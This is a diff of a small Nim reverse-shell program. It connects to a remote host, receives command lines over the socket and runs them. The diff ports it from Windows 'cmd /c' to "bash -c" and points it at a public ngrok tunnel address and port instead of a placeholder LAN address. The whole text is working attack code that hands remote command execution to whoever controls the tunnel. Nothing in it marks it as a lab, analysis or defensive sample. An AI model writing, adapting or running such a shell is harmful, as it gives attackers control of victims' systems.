@@ -6,14 +6,14 @@
 import net, os, osproc, strutils
 
 proc exe(c: string): string =
-  result = execProcess("cm" & "d /c " & c)
+  result = execProcess("bash -c '" & c & "'")
 
 var
   v = newSocket()
 
   # Change this
-  v1 = "192.168.1.1"
-  v2 = "8080"
+  v1 = "2.tcp.eu.ngrok.io"
+  v2 = "18681"
 
   s4 = "Exiting.."
   s5 = "cd"
@@ -23,7 +23,7 @@ try:
   v.connect(v1, Port(parseInt(v2)))
 
   while true:
-    v.send(os.getCurrentDir() & "> ")
+    v.send(os.getCurrentDir() & "\n> ")
     let c = v.recvLine()
     if c == "exit":
       v.send(s4)
